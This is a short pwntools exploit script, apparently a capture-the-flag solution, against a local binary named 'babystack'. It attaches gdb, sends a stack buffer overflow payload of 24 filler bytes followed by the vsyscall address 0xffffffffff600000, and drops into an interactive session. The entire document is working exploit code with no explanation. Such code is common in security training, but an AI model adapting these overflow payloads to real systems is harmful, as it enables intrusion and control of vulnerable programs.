from pwn import *
p=process('./babystack')
gdb.attach(p)
payload = 'a'*24 + p64(0xffffffffff600000)
p.sendline(payload)
p.interactive()
